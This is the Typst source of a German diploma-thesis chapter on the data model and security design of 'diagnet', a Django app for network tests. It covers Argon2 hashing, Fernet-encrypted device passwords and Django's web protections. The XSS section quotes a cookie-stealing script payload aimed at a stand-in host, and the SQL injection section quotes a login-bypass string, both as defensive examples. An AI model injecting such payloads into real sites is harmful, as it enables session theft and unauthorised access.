#import "@preview/htl3r-da:2.0.0" as htl3r

#htl3r.author("Karun Sandhu")
== Datenmodellierung <data_modeling>

Eine Webanwendung ist letztlich nur so zuverlässig wie das Datenbankschema, auf dem sie aufbaut. Für #htl3r.long[diagnet] bedeutete das, zwei unterschiedliche Anforderungen unter einen Hut zu bringen: Einerseits mussten die Datenstrukturen flexibel genug sein, um sehr unterschiedliche Netzwerktests mit ihren jeweiligen Parametern abzubilden. Andererseits durfte diese Flexibilität nicht auf Kosten der Datenintegrität gehen, da fehlerhafte Konfigurationen in einem Netzwerktestsystem direkt zu falschen Testergebnissen führen können. Da das Schema in seiner Gesamtheit zu komplex für eine einzelne Abbildung wäre, zeigen @erd_struktur und @erd_ausfuehrung jeweils eine vereinfachte Sicht, die auf die für das Verständnis wesentlichen Felder und Relationen reduziert wurde.

#figure(
  image("../assets/erd_struktur.png", width: 100%),
  caption: [Datenbankschema: Geräteverwaltung und Teststruktur],
) <erd_struktur>

Die rekursive Selbstreferenz von `TestParameter` über `parent_test_parameter_id` ist aus Gründen der Übersichtlichkeit nicht dargestellt.

#pagebreak()

#figure(
  image("../assets/erd_ausfuehrung.png", width: 100%),
  caption: [Datenbankschema: Testausführung und Gruppierung],
) <erd_ausfuehrung>

=== Entity-Relationship-Modell und konzeptionelle #box[Grundlagen]

Bevor die konkrete Implementierung der Django-Modelle in Angriff genommen wurde, war eine sorgfältige Analyse der fachlichen Anforderungen notwendig. Ziel der Datenmodellierung war es, die realen Entitäten des Netzwerktestbetriebs (Geräte, Testfälle, deren Parameter sowie die historischen Ergebnisse) in ein konsistentes, normalisiertes relationales Schema zu überführen. Als Designgrundlage dient die #htl3r.full[3nf], um Redundanzen zu minimieren und die referenzielle Integrität der Daten zu wahren.

Das resultierende Datenmodell gliedert sich in vier Bereiche. Die *Geräteverwaltung* bildet physische und virtuelle Netzwerkgeräte samt ihren Verbindungsparametern ab. Die *Testfall-Domäne* beschreibt die abstrakten Testvorlagen inklusive des Python-Modulnamens für den dynamischen Classloader. Die *Parametrisierung* bildet die zur Laufzeit übergebenen Argumente in einer rekursiven Baumstruktur ab, da Netzwerktests sehr unterschiedliche Eingaben erfordern können. Abgeschlossene Testläufe werden schließlich in der *Ergebnisdomäne* unveränderlich gespeichert, damit jeder Zustandswechsel der Infrastruktur nachvollziehbar bleibt.

#pagebreak()

=== Das Device-Modell: Integrität auf Feldebene

Das Modell `Device` ist das Fundament der Anwendung, da nahezu jede andere Entität eine Beziehung zu einem Gerät aufweist. Aus diesem Grund wurden die Validierungsregeln direkt auf Datenbankebene an dieses Modell gebunden, um fehlerhafte Eingaben so früh wie möglich im Datenfluss abzufangen.

Für das Feld `ip_address` kommt Djangos natives `GenericIPAddressField` zum Einsatz. Dieser Feldtyp erzwingt auf Datenbankebene, dass ausschließlich syntaktisch korrekte IPv4- oder IPv6-Adressen persistiert werden können. Der Port wird als `IntegerField` mit den Validatoren `MinValueValidator(1)` und `MaxValueValidator(65535)` abgesichert, was dem durch #htl3r.full[tcp]/#htl3r.short[udp] definierten gültigen Portbereich entspricht. Für das Verbindungsprotokoll wurde ein `CharField` mit einer `choices`-Enumeration gewählt, sodass ausschließlich die definierten Werte `ssh` und `telnet` akzeptiert werden. Das Feld `device_type` unterscheidet zwischen sechs Geräteklassen, die jeweils Router- und Switch-Varianten der Betriebssysteme IOS, IOSXE und IOSXR abdecken.

Die kritischste Integritätsregel wird jedoch durch einen `CheckConstraint` in der inneren `Meta`-Klasse des Modells durchgesetzt. Da das unverschlüsselte #htl3r.long[telnet]-Protokoll ein inakzeptables Sicherheitsrisiko darstellt, wird dessen Verwendung in Kombination mit IOSXE-Geräten auf Datenbankebene hart unterbunden. Der Constraint greift dabei auf einen Suffix-Vergleich zurück (`device_type__endswith="iosxe"`), da sowohl Router als auch Switches unter IOSXE fallen:

#pagebreak()

#htl3r.code(
  caption: [Protokoll-Constraint zur Verhinderung von Telnet auf IOSXE-Geräten],
  description: `devices/models.py`,
)[
  ```python
  class Device(models.Model):
      PROTOCOLS = [
          ("ssh", "SSH"),
          ("telnet", "Telnet"),
      ]
      DEVICE_TYPES = [
          ("router_ios", "Router (IOS)"),
          ("router_iosxe", "Router (IOSXE)"),
          ("router_iosxr", "Router (IOSXR)"),
          ("switch_ios", "Switch (IOS)"),
          ("switch_iosxe", "Switch (IOSXE)"),
          ("switch_iosxr", "Switch (IOSXR)"),
      ]

      name = models.CharField("Hostname", max_length=100, unique=True)
      ip_address = models.GenericIPAddressField("IP Address")
      port = models.IntegerField(
          default=22,
          validators=[MinValueValidator(1), MaxValueValidator(65535)]
      )
      protocol = models.CharField("Protocol", choices=PROTOCOLS, default="ssh")
      device_type = models.CharField("Device Type", max_length=20, choices=DEVICE_TYPES)

      class Meta:
          constraints = [
              models.CheckConstraint(
                  condition=~(Q(protocol="telnet") & Q(device_type__endswith="iosxe")),
                  name="no_telnet_on_iosxe",
                  violation_error_message="Telnet is not allowed for IOSXE devices.",
              )
          ]
  ```
]

#pagebreak()

Dieser Ansatz ist der alternativen Implementierung einer Validierung in der View oder im Formular vorzuziehen. Ein Constraint auf Datenbankebene greift unabhängig davon, über welchen Pfad Daten eingespielt werden, ob über die Web-Oberfläche, die #htl3r.short[api] oder direkt per Datenbankzugriff.

=== Das TestCase-Modell: Dynamisches Laden via Reflection

Das Modell `TestCase` repräsentiert eine abstrakte Testvorlage. Sein zentrales Feld `test_module` speichert den Namen der Python-Klasse, die die eigentliche Testlogik implementiert. Die Test-Engine lädt diese Klasse zur Laufzeit dynamisch, was einem Reflection-Muster entspricht. Damit dieser Mechanismus fehlerfrei funktioniert, muss der gespeicherte Name zwingend der PascalCase-Namenskonvention von Python entsprechen. Diese Anforderung wird durch einen `RegexValidator` direkt am Datenbankfeld erzwungen. Dieser verhindert, dass ein Netzwerkadministrator einen Modulnamen hinterlegt, der beim dynamischen Laden zu einem `ImportError` führen würde, ohne dass dies beim Speichern explizit kommuniziert wird.

Die Zuordnung eines Testfalls zu den Geräten, auf denen er ausgeführt werden soll, erfolgt nicht über ein direktes `ManyToManyField`, sondern über das separate Modell `TestDevice`. Dieses hält je einen `ForeignKey` auf `TestCase` sowie auf `Device` und ermöglicht so, einem Testfall beliebig viele Geräte zuzuordnen, ohne dass die Gerätekonfiguration dupliziert werden muss. Die Trennung in ein eigenständiges Modell bietet den Vorteil, dass pro Zuordnung zusätzliche Metadaten gespeichert werden könnten, ohne das `TestCase`-Modell selbst zu erweitern.

=== Parametrisierung: Rekursive Baumstruktur

Eine besondere Herausforderung bei der Datenmodellierung stellte die Abbildung der Testparameter dar. Netzwerktests sind in ihrer Parametrisierung sehr heterogen: Ein einfacher Ping-Test benötigt lediglich eine Zieladresse, während ein Routing-Test eine vollständige Liste von Präfixen, zugehörigen Next-Hops und weiteren Metadaten erwartet.

#pagebreak()

Um diese beliebig tief verschachtelten Strukturen in einem flachen relationalen Datenbankschema abzubilden, wurde das Modell `TestParameter` mit einer reflexiven Many-to-One-Beziehung versehen. Ein `TestParameter`-Datensatz kann über das Feld `parent_test_parameter` auf einen anderen `TestParameter` desselben Typs verweisen, womit er in der Hierarchie eine Kindposition einnimmt. Diese Technik, bekannt als *Adjacency List*, ist ein etabliertes Entwurfsmuster für die Speicherung von Baumstrukturen in relationalen Datenbanken. Sowohl `name` als auch `value` sind als `TextField` ohne Längenbegrenzung deklariert, da die maximale Länge eines Parameterwerts nicht vorhersehbar ist:

#htl3r.code(
  caption: [Reflexive Selbstreferenz des TestParameter-Modells],
  description: `networktests/models.py`,
)[
  ```python
  class TestParameter(models.Model):
      name = models.TextField()
      value = models.TextField(blank=True, null=True)
      test_case = models.ForeignKey(
          TestCase,
          on_delete=models.CASCADE,
          related_name="parameters",
          null=True,
          blank=True,
      )
      parent_test_parameter = models.ForeignKey(
          "self",
          on_delete=models.CASCADE,
          related_name="parent_parameter",
          null=True,
          blank=True,
      )
  ```
]

Zum Zeitpunkt der Testausführung muss diese Datenbankstruktur in ein maschinenlesbares #htl3r.full[json]-Objekt umgewandelt werden, das die Test-Engine als Eingabe erwartet. Hierfür implementiert das `TestCase`-Modell die Methode `getListParameter()`, die die Baumstruktur rekursiv traversiert. Trifft die Methode auf einen Parameter, dessen `value` auf den Sentinel-Wert `"list"` gesetzt ist, ruft sie sich selbst mit dem entsprechenden Kind-Knoten auf, anstatt dessen Wert direkt zu verwenden. Device-Parameter werden dabei über den separaten `related_name` `device_parent_parameter` aufgelöst und als Django-Modell-Instanzen eingebettet. Das Ergebnis ist eine korrekt verschachtelte Python-Liste im Format, das die Test-Engine als #htl3r.short[json]-Eingabe erwartet.

=== Die TestGroup: Batch-Ausführung durch ManyToMany

Um Netzwerkadministratoren die Möglichkeit zu geben, eine große Anzahl an Tests mit einem einzigen Aufruf zu starten, wurde die Entität `TestGroup` eingeführt. Das Modell besitzt eine `ManyToManyField`-Beziehung zu `TestCase` und bündelt damit eine beliebige Sammlung von Testfällen.

#htl3r.code(
  caption: [Gruppierung von Testfällen via ManyToMany-Relation],
  description: `networktests/models.py`,
)[
  ```python
  class TestGroup(models.Model):
      name = models.CharField(max_length=50, unique=True)
      testcases = models.ManyToManyField(TestCase)
  ```
]

In der relationalen Datenbank wird diese Beziehung durch eine automatisch von Djangos #htl3r.short[orm] verwaltete Zwischentabelle realisiert, die nur die Fremdschlüssel beider Entitäten hält. Das bedeutet, dass derselbe `TestCase` in mehreren `TestGroup`-Instanzen referenziert werden kann, ohne dass dessen Konfiguration dupliziert werden muss.

=== Persistierung von Testergebnissen

Nach Abschluss eines Testlaufs speichert #htl3r.long[diagnet] das vollständige Ergebnis im Modell `TestResult`. Das Modell hält dabei zwei getrennte Zeitstempelfelder: `started_at` und `finished_at`, womit die Laufzeit eines Tests präzise nachvollziehbar bleibt. Das boolesche Feld `result` speichert, ob der Test bestanden wurde. Die eigentlichen Rohlogs und der strukturierte Statusbericht der Test-Engine werden im separaten `JSONField` `log` abgelegt, das direkt über Python-Dictionary-Syntax abfragbar ist, ohne vorher als Rohtext geparst werden zu müssen.

#pagebreak()

Die `save()`-Überschreibung folgt dem Prinzip des *Fat Model, Thin View*: Logik, die unabhängig vom Aufrufpfad korrekt laufen muss, gehört ins Modell und nicht in die View. Beim erstmaligen Speichern eines neuen `TestResult`-Datensatzes ermittelt die Methode den höchsten bereits vergebenen `attempt_id`-Wert für den entsprechenden `TestCase` und setzt den neuen Wert auf das nächste Inkrement:

#htl3r.code(
  caption: [Automatische Vergabe der attempt\_id beim Speichern eines Testergebnisses],
  description: `networktests/models.py`,
)[
  ```python
  class TestResult(models.Model):
      test_case = models.ForeignKey(
          TestCase, on_delete=models.CASCADE, related_name="results"
      )
      attempt_id = models.IntegerField(null=True, blank=True)
      started_at = models.DateTimeField()
      finished_at = models.DateTimeField(blank=True, null=True)
      result = models.BooleanField()
      log = models.JSONField(blank=True, null=True)

      class Meta:
          unique_together = ("attempt_id", "test_case")

      def save(self, *args, **kwargs):
          if self.attempt_id is None:
              last = (
                  TestResult.objects.filter(test_case=self.test_case)
                  .order_by("-attempt_id")
                  .first()
              )
              self.attempt_id = (last.attempt_id + 1) if last else 1
          super().save(*args, **kwargs)
  ```
]

Die `save()`-Implementierung ist dabei bewusst defensiv gestaltet: Statt alle vorhandenen Einträge zu zählen, wird der höchste bestehende `attempt_id`-Wert über `.order_by("-attempt_id").first()` ermittelt. Dieser Ansatz ist robuster, da er auch dann korrekt funktioniert, wenn zwischenzeitlich einzelne Ergebnisse gelöscht wurden. Das Constraint `unique_together` auf `(attempt_id, test_case)` sichert auf Datenbankebene zusätzlich ab, dass keine zwei Ergebnisse dieselbe Versuchsnummer für denselben Testfall erhalten können.

=== Datenbankmigrationen als versioniertes Schema

Jede Änderung an einem Django-Modell, sei es das Hinzufügen eines Feldes, die Modifikation eines Constraints oder die Einführung einer neuen Relation, wird durch das Migrationssystem des #htl3r.long[framework] als eigenständige, versionierte Migrationsdatei im Verzeichnis `migrations/` abgelegt. Diese Dateien sind Python-Skripte, die die Zustandsveränderung des Datenbankschemas atomar und reproduzierbar beschreiben.

Für den Produktionseinsatz von #htl3r.long[diagnet] hat dieses Vorgehen einen entscheidenden Vorteil: Das Datenbankschema kann von einem leeren Zustand aus durch den Befehl `python manage.py migrate` vollständig aufgebaut werden, ohne dass manuelle #htl3r.short[sql]-Skripte notwendig wären. Die Migrationsdateien selbst werden im Git-Repository versioniert und bieten damit eine nachvollziehbare Historie aller Schemaänderungen über die gesamte Projektlaufzeit.

#pagebreak()

== Datensicherheit <data_security>

Zugangsdaten für Netzwerkgeräte zählen zu den sensibelsten Informationen einer IT-Infrastruktur. Dieses Kapitel beschreibt die Maßnahmen, die in #htl3r.long[diagnet] ergriffen wurden, um diese Daten sowohl im gespeicherten Zustand als auch während der Benutzerinteraktion zu schützen.

=== Passwortsicherheit: Argon2 <password_security>

Für die Absicherung von Benutzerpasswörtern setzt #htl3r.long[diagnet] auf Argon2id als Password-Hashing-Algorithmus. Django unterstützt Argon2 als optionales Hasher-Backend über die externe Abhängigkeit `argon2-cffi` @django-docs. Da Django standardmäßig PBKDF2-SHA256 verwendet, wurde `PASSWORD_HASHERS` in `settings.py` explizit überschrieben, um Argon2id an die erste Stelle zu setzen:

#htl3r.code(
  caption: [Konfiguration von Argon2id als primärem Password-Hasher],
  description: `diagnet/settings.py`,
)[
  ```python
  PASSWORD_HASHERS = [
      "django.contrib.auth.hashers.Argon2PasswordHasher",
      "django.contrib.auth.hashers.PBKDF2PasswordHasher",
  ]
  ```
]

Der zweite Eintrag dient der Rückwärtskompatibilität: Existierende Passwörter, die noch mit PBKDF2 gehasht wurden, können weiterhin verifiziert werden. Beim nächsten erfolgreichen Login wird das Passwort automatisch mit Argon2id neu gehasht.

==== Funktionsprinzip von Argon2

Argon2 ist eine *Key Derivation Function* und gewann 2015 den Password Hashing Competition, der explizit nach einem Nachfolger für ältere Verfahren wie bcrypt und PBKDF2 suchte @rfc9106. Der entscheidende Unterschied zu diesen Vorgängern liegt darin, dass Argon2 nicht nur rechenintensiv, sondern auch gezielt *speicherintensiv* ist. Die Speicheranforderung lässt sich über den Parameter `memory_cost` in Kilobyte konfigurieren und ist fester Bestandteil der Algorithmusdefinition, nicht nachträgliche Optimierung.

#pagebreak()

Argon2 existiert in drei Varianten: Argon2d ist optimiert gegen GPU-Angriffe, Argon2i gegen Seitenkanalangriffe, und Argon2id kombiniert beide Ansätze. Djangos Implementierung verwendet standardmäßig Argon2id, was für allgemeine Passwort-Hashing-Zwecke die empfohlene Wahl ist.

Die drei zentralen Kostparameter sind `time_cost` (Anzahl der Iterationen), `memory_cost` (Speicherbedarf in KiB) und `parallelism` (Anzahl paralleler Threads). Die konkreten Mindestwerte für diese Parameter orientieren sich an den Empfehlungen der #htl3r.full[owasp] @owasp-password-storage. Ein Angreifer, der GPU-Hardware einsetzt, profitiert bei Argon2id weit weniger als bei rein rechenintensiven Verfahren: Grafikprozessoren verfügen zwar über tausende von Rechenkernen, aber über vergleichsweise wenig schnellen On-Chip-Speicher. Die Speicheranforderung von Argon2id zwingt jeden parallelen Angriff, diesen knappen Speicher zu belegen, was die effektiv nutzbare Parallelität drastisch reduziert.

==== Warum nicht PBKDF2?

PBKDF2-SHA256 ist der Django-Standard und kryptografisch nicht gebrochen, aber rein rechenintensiv und lässt sich auf moderner GPU-Hardware effizient parallelisieren. Ein Angreifer mit einer Consumer-GPU kann PBKDF2-Hashes in einer Größenordnung von hunderten Millionen Versuchen pro Sekunde testen, sofern er Zugriff auf die Datenbank erlangt hat. Die Speicherbindung von Argon2id macht diesen Vorteil zunichte. Da `argon2-cffi` eine einzelne, stabile Abhängigkeit ohne eigene Transitivabhängigkeiten ist, überwiegt der Sicherheitsgewinn.

=== Verschlüsselung von Gerätepasswörtern: Fernet <device_encryption>

Benutzerpasswörter werden gehasht, weil Django bei der Authentifizierung nur den Hash vergleicht und den Klartext nie benötigt. Bei Zugangsdaten für Netzwerkgeräte ist das anders: #htl3r.long[diagnet] muss `password` und `enable_password` im Klartext an pyATS übergeben, da Einwegfunktionen hier nicht verwendbar sind. Die Anforderung ist reversible *Verschlüsselung*.

Für diesen Zweck kommt `cryptography.fernet` zum Einsatz, eine Python-Bibliothek, die auf dem Konzept der authentifizierten symmetrischen Verschlüsselung aufbaut @fernet-spec.

==== Aufbau eines Fernet-Tokens

Ein Fernet-Token ist kein roher Chiffretext, sondern ein strukturiertes, selbstbeschreibendes Format. Jedes Token besteht aus den in @fernet_token_struktur aufgeführten Komponenten, die base64url-kodiert als einheitlicher String gespeichert werden:

#figure(
  table(
    columns: (auto, 1fr, auto),
    table.header([*Feld*], [*Inhalt*], [*Größe*]),
    [`Version`], [Versionsbyte, fest auf `0x80`], [1 Byte],
    [`Timestamp`],
    [Zeitpunkt der Verschlüsselung (64-bit big-endian)],
    [8 Byte],

    [`IV`], [Zufälliger Initialisierungsvektor für AES-CBC], [16 Byte],
    [`Ciphertext`], [Mit AES-128-CBC verschlüsselte Nutzlast], [variabel],
    [`HMAC`], [SHA-256-MAC über alle vorherigen Felder], [32 Byte],
  ),
  caption: [Struktur eines Fernet-Tokens],
) <fernet_token_struktur>

Der Chiffretext wird mit *AES-128-CBC* erzeugt. Der 256-Bit-Fernet-Schlüssel wird dabei aufgeteilt: Die ersten 128 Bit dienen als Signaturschlüssel für den #htl3r.full[hmac], die zweiten 128 Bit als Verschlüsselungsschlüssel für AES @fernet-spec. Der Timestamp ist Teil des authentifizierten Bereichs, weshalb ein Angreifer das Ausstellungsdatum eines Tokens nicht nachträglich manipulieren kann, ohne den #htl3r.short[hmac] zu brechen.

==== HMAC als Integritätssicherung

Der #htl3r.short[hmac] am Ende des Tokens ist der entscheidende Unterschied zwischen reiner Verschlüsselung und *authentifizierter* Verschlüsselung @rfc2104. AES-CBC allein würde nur Vertraulichkeit bieten, aber keine Integrität: Ein Angreifer oder ein Übertragungsfehler könnte Bits im Chiffretext verändern, und das System würde beim Entschlüsseln fehlerhafte Daten produzieren, ohne dies zu erkennen. Fernet löst dieses Problem durch #htl3r.short[hmac]-SHA256: Bevor entschlüsselt wird, verifiziert die Bibliothek den MAC kryptografisch gegen den gespeicherten Schlüssel. Schlägt diese Verifikation fehl, wird eine `InvalidToken`-Exception geworfen; die Entschlüsselung beginnt gar nicht erst.

#pagebreak()

In der `_decrypt_value`-Methode des `Device`-Modells wird genau dieses Verhalten genutzt:

#htl3r.code(
  caption: [Entschlüsselung mit Integritätsprüfung im Device-Modell],
  description: `devices/models.py`,
)[
  ```python
  def _decrypt_value(self, value: str) -> str:
      if not value.startswith(self.ENCRYPTION_PREFIX):
          raise ValidationError(
              f"Decryption Error: Data corruption detected. "
              f"Stored value is missing the required '{self.ENCRYPTION_PREFIX}' prefix."
          )

      actual_value = value[len(self.ENCRYPTION_PREFIX):]

      if not self._is_fernet_token(actual_value):
          raise ValidationError(
              "Decryption Error: Data marked as encrypted "
              "does not follow the expected format."
          )

      f = self._get_cipher_suite()
      try:
          return f.decrypt(actual_value.encode()).decode()
      except (InvalidToken, ValueError):
          raise ImproperlyConfigured(
              "Security Error: Data marked as encrypted looks like a valid token "
              "but cannot be decrypted with the current key. "
              "Verify DEVICE_ENCRYPTION_KEY."
          )
  ```
]

Das Präfix `enc:` vor jedem gespeicherten Wert dient als explizites Marker-Byte auf Anwendungsebene. Damit lässt sich beim Laden eines Datensatzes eindeutig feststellen, ob ein Feld bereits verschlüsselt ist oder ob es sich um Klartextdaten aus einer Migration oder einem Fehler handelt. Die Methode `_is_fernet_token()` prüft zusätzlich das Versionsbyte `0x80` sowie die Mindestlänge des base64url-dekodierten Tokens, bevor überhaupt eine Entschlüsselung versucht wird. Damit wird verhindert, dass beliebige Zeichenketten zur Entschlüsselung eingereicht werden können.

==== Schlüsselverwaltung und Key Rotation

Der Fernet-Schlüssel (`DIAGNET_DEVICE_ENCRYPTION_KEY`) wird beim ersten Start der Anwendung automatisch generiert und in `secrets.env` innerhalb des konfigurierten Datenpfads persistiert. Dieser Schlüssel muss mit demselben Schutzniveau behandelt werden wie ein privater Zertifikatsschlüssel: Er darf nicht im Versionskontrollsystem landen und muss bei einem kompromittierenden Vorfall rotiert werden.

Für diesen Fall implementiert #htl3r.long[diagnet] den Management-Befehl `rotate_encryption_key`. Dieser entschlüsselt alle gespeicherten Gerätepasswörter mit dem alten Schlüssel und verschlüsselt sie atomar in derselben Datenbanktransaktion mit dem neuen Schlüssel. Der Einsatz von `transaction.atomic()` stellt sicher, dass die Datenbank im Fehlerfall konsistent bleibt: Entweder sind alle Passwörter mit dem neuen Schlüssel verschlüsselt, oder kein einziges.

#htl3r.code(
  caption: [Atomare Schlüsselrotation via Django-Management-Befehl],
  description: `devices/management/commands/rotate_encryption_key.py`,
)[
  ```python
  with transaction.atomic():
      for device in devices:
          for field_name in ["password", "enable_password"]:
              val = getattr(device, field_name)
              actual_encrypted = val[len(Device.ENCRYPTION_PREFIX):]
              plain = fernet_old.decrypt(actual_encrypted.encode()).decode()
              new_enc = (
                  f"{Device.ENCRYPTION_PREFIX}"
                  f"{fernet_new.encrypt(plain.encode()).decode()}"
              )
              setattr(device, field_name, new_enc)
          Device.objects.filter(pk=device.pk).update(
              password=device.password,
              enable_password=device.enable_password,
          )
  ```
]

#pagebreak()

=== Web-Sicherheit: Djangos eingebaute #box[Schutzmechanismen] <web_security>

Neben der Absicherung gespeicherter Daten muss eine Webanwendung auch gegen aktive Angriffe auf die Benutzerinteraktion gewappnet sein. Django adressiert die gängigsten Angriffsvektoren durch Mechanismen, die standardmäßig aktiv sind und in `settings.py` über die `MIDDLEWARE`-Liste eingebunden werden @django-security. Für #htl3r.long[diagnet] relevant sind vor allem drei davon.

==== Cross-Site Request Forgery

Bei einem #htl3r.full[csrf]-Angriff bringt eine fremde Website einen bereits authentifizierten Benutzer dazu, ungewollt eine Anfrage an die Zielanwendung zu stellen, etwa durch ein verstecktes Formular, das beim Laden der Seite automatisch abgeschickt wird @owasp-top10. Da der Browser die Session-Cookies automatisch mitschickt, kann der Server die Anfrage nicht anhand der Cookies von einer legitimen unterscheiden.

Django begegnet diesem Angriff mit dem `CsrfViewMiddleware`-Token-Verfahren. Bei jeder serverseitig gerenderten Seite wird ein kryptografisch zufälliger Token in ein verstecktes Formularfeld (`{% csrf_token %}`) eingebettet. Dieser Token ist an die Session des Benutzers gebunden. Eingehende POST-, PUT- und DELETE-Anfragen werden abgelehnt, wenn der Token fehlt oder nicht mit dem session-gebundenen Wert übereinstimmt. Eine externe Website kann diesen Token nicht auslesen, da die Same-Origin-Policy des Browsers den JavaScript-Zugriff auf Inhalte fremder Domains unterbindet.

In den Templates von #htl3r.long[diagnet] ist `{% csrf_token %}` in jedem Formular eingebunden, beginnend beim Login-Formular bis hin zu allen zustandsverändernden Operationen wie dem Anlegen oder Löschen von Geräten.

#pagebreak()

==== Cross-Site Scripting

#htl3r.full[xss]-Angriffe zielen darauf ab, schadhaften JavaScript-Code in die Ausgabe einer Webanwendung einzuschleusen, der dann im Browser anderer Benutzer ausgeführt wird. Im einfachsten Fall könnte ein Angreifer einen Hostnamen wie `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` in das Namensfeld eines Geräts eintragen. Würde dieser Wert ungefiltert in eine HTML-Seite eingebettet, könnten die Session-Cookies aller Benutzer, die diese Seite aufrufen, an einen Angreifer übermittelt werden.

Django verhindert dies durch automatisches HTML-Escaping in seiner Template-Engine. Jede Variable, die mit `{{ variable }}` ausgegeben wird, wird standardmäßig escaped: `<` wird zu `&lt;`, `>` zu `&gt;` und `"` zu `&quot;`. Der oben genannte Angriffsversuch würde damit als harmloser Klartext im Browser angezeigt, nicht als ausführbarer Code. In #htl3r.long[diagnet] kommt der `safe`-Filter, der das Escaping explizit deaktiviert, in keinem Template vor.

==== SQL-Injection

Bei einer #htl3r.short[sql]-Injection-Attacke werden benutzerkontrollierte Eingaben ungefiltert in #htl3r.short[sql]-Abfragen eingebettet, was einem Angreifer ermöglicht, die Abfragelogik zu verändern. Der klassische Angriff `' OR '1'='1` in einem Login-Formular würde eine naiv implementierte Authentifizierungsabfrage aushebeln und Zugriff ohne gültige Credentials gewähren.

Da #htl3r.long[diagnet] ausschließlich Djangos #htl3r.short[orm] für Datenbankoperationen einsetzt und an keiner Stelle rohe #htl3r.short[sql]-Strings mit Benutzerinhalten konkateniert werden, ist dieser Angriffsvektor ausgeschlossen. Das #htl3r.short[orm] verwendet intern *Prepared Statements* mit parametrisierten Queries, bei denen die Datenbank Abfragestruktur und Benutzerdaten als vollständig getrennte Elemente erhält. Die Datenbank-Engine interpretiert Benutzereingaben damit nicht als #htl3r.short[sql]-Code, unabhängig von deren Inhalt.

#pagebreak()

==== Clickjacking und HTTP-Sicherheitsheader

Djangos `XFrameOptionsMiddleware` setzt den HTTP-Response-Header `X-Frame-Options: DENY`, der dem Browser mitteilt, dass die Anwendung nicht in einem `<iframe>` eingebettet werden darf. Dieser Schutz verhindert sogenannte Clickjacking-Angriffe, bei denen eine legitime Seite unsichtbar über einer manipulierten Seite überlagert wird, um Benutzerklicks abzufangen. Da #htl3r.long[diagnet] keine einbettbaren Inhalte anbietet, ist diese Einschränkung ohne funktionalen Nachteil.

Die `SecurityMiddleware` setzt bei korrekt konfiguriertem TLS zusätzlich den `Strict-Transport-Security`-Header, der den Browser anweist, ausschließlich HTTPS-Verbindungen zu dieser Domain zuzulassen. Da #htl3r.long[diagnet] in Produktivumgebungen hinter einem Reverse Proxy mit TLS-Terminierung betrieben wird, greift dieser Mechanismus dort vollständig.
